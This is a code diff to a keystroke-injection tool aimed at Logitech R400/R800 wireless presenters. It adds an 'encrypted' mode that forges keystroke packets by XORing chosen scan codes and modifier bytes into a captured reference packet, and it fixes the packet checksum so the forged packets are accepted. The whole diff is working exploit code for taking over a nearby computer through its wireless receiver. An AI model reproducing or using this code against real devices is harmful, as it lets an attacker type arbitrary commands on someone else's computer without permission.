@@ -8,13 +8,17 @@ import crcmod
 import struct
 
 
+KEYUP_REF = "00:D3:A9:CC:DE:A0:4E:4B:FD:9B:8B:98:F9:E7:00:00:00:00:00:00:00"
+
+
 # Logitech R400/R800 wireless presenter
 class Logitech(Protocol):
 
   # Constructor
-  def __init__(self, address):
+  def __init__(self, address, encrypted=False):
 
     self.address = address
+    self.encrypted = encrypted
 
     super(Logitech, self).__init__("Logitech")
 
@@ -41,9 +45,18 @@ class Logitech(Protocol):
     if win: modifiers |= 0x08
 
     # Build and enqueue the payload
-    payload = ("00:C1::%02x:00:%02x:00:00:00:00" % (modifiers, scan_code)).replace(":", "").decode("hex")
-    payload += chr(0x100-(sum(ord(c) for c in payload)&0xFF))
+    if not self.encrypted:
+      payload = ("00:C1:%02x:00:%02x:00:00:00:00" % (modifiers, scan_code)).replace(":", "").decode("hex")
+    else:
+      ref = KEYUP_REF.replace(":", "").decode("hex")
+      idx = 8
+      modidx = 2
+      payload = ref
+      payload = payload[0:idx] + chr(scan_code^ord(ref[idx])) + payload[idx+1:]
+      payload = payload[0:modidx] + chr(modifiers^ord(ref[modidx])) + payload[modidx+1:]
+    payload += chr((0x100-(sum(ord(c) for c in payload)&0xFF))&0xFF)
     self.tx_queue.append(payload)
+    print(':'.join("%02x"%ord(c) for c in payload))
 
 
   # Enter injection mode
@@ -116,6 +129,7 @@ class Logitech(Protocol):
           self.tx_queue.appendleft(payload)
         else:
           last_packet = time.time()
+
 
   # Leave injection mode
   def stop_injection(self):
